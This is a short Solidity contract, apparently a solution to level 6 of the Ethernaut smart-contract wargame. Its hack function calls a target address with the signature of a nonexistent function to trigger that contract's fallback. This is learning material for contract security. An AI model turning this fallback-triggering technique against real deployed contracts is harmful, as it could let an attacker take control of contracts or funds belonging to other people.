// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

contract Ethernaut06 {
    constructor() {}

    function hack(address _address) public {
        (bool success, bytes memory data) = _address.call(
            abi.encodeWithSignature("doesNotExist()")
        );
    }
}